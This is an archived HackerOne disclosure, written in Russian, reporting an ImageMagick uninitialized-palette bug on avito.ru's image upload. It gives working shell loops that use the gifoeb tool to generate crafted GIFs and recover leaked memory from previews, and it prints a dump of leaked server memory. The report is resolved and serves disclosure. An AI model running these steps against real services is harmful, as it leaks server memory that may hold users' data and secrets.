---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/memory-corruption-generic
  - env/web
substate: "resolved"
weakness: "Memory Corruption - Generic"
enriched: true
body: true
date: 2021-04-24
submitted: 2017-09-24T19:10:37.775Z
bounty_usd: null
votes: 18
cve: []
program: "[[programs/avito|Avito]]"
reporter: "kxyry"
source: "https://hackerone.com/reports/271355"
title: "[avito.ru] ImageMagick uninitialized image palette"
---
# [avito.ru] ImageMagick uninitialized image palette

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 18 | **Program:** Avito | **Disclosed:** 2021-04-24

- Report: [https://hackerone.com/reports/271355](https://hackerone.com/reports/271355)
- CWE: Memory Corruption - Generic
- Submitted: 2017-09-24T19:10:37.775Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Привет!

При подаче объявления можно загружать фотографии. Они обрабатываются уязвимой версией ImageMagick.
Для эксплуатация запускаем https://github.com/neex/gifoeb
Генерируем payload.
```
r=640x480
mkdir -p for_upload &&
for i in `seq 1 10`; do
   ./gifoeb gen $r for_upload/$i.gif;
done
```
Загружаем наши картинки из превью (заменив разрешение на 640x480), выгружаем результат в папку ```previews```
Запускаем скрипт.
```
  for p in previews/*; do
    ./gifoeb recover $p | strings;
  done
```
Видим лики из памяти. Из-за того, что в результате обработки мы получаем jpeg формат, в выводе мы можем получить ошибки, которые мы можем устранить разными способами.

В результате эксплуатации я получил следующий лик памяти.
```
.i{~
xordIarh
ndew.sv
lohin
1_7560085
n`md
pinnd
7:2009406p
.i{~
9311c560
qegistratiooTine
sucsbrhcedNews
stbsbrhbddSelip
.i{~
Enails
isFosKnrcjteb
isPhbntol
irSobial
llSrbbkhog
creo
.i{~
#kz~
RELECT 11
TRSU
TRSU
w-data/t@
/khb
22T17:34920+13;00
st: /hpmf/wvw,data/tahs/auito/Ddolnz_1407090154/releard3/veodoq/cpnposer.../cpre0service-jm`ge-ttosage-cmhent/rsc/Cord/Clidntt/IlageTtorage.qhp
/hole/www-daua/tags/bviso0Eeploy`05/6181264/release2/vdneoq/dosd/sesvice.image-ssoragd-clienu/src0Cpre0Cmhents0ImagfTtosage.Q
Typd: multioart/fprm-dat`; bpundary=--------------------
3U:94n[45
o"9bf952+:3k3>D-3=e
vshoufN^
btTmZu]kuP
6#)6-T:9>0#li&OGV*92q)4;0[k/Io_
szammtvOmnpO_ydQ
ggiOolbu_iE_
7_^ldWqeoG
-QQnFhdfQt_
`lGfnPhsblxea
ktIgflund
knYuabWv
GoikBT
bKOk_lsyv
gtItayXs
ST_bglnX
#\t^UyoVZ]iQabAldn
Xy^tkndWk`Y=cO
 xdc
1f\wquwlrR_p}<|jjlaeLguf
HXU1
]KUP
[TNn
:40+13;00
URSS
TRSU
URSS
1/07/
itn.ru.ru/images/024/62/07/
th: 38297
Cpmse0
URSS
xordIarh
ndew.sv
lohin
1_7560085
n`md
pinnd
7:2009406p
9311c560
qegistratiooTine
sucsbrhcedNews
stbsbrhbddSelip
Enails
isFosKnrcjteb
isPhbntol
irSobial
llSrbbkhog
creo
/hole/www-daua/s1
```

**Рекомендации**
Ошибка, приводящая к утечке данных из неинициализированной палитры в ImageMagick позволяет просматривать фрагменты памяти сервера. В этом процессе может оказаться что-то интересное, например: данные других пользователей, ключи, пароли итд. Поэтому результат эксплуатации может быть очень серьёзен.
Оригинальный issue и описание уязвимости на гитхабе https://github.com/ImageMagick/ImageMagick/issues/592.
Патч, который закрывает данную уязвимость https://github.com/ImageMagick/ImageMagick/commit/10aae21bf9dac47e16d8fcde7eba7f7f9d1e52f8

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Resolved**
- **2017-09-28** @kxyry: Пожалуйста :)
- **Agreed On Going Public**
- **Report Became Public**
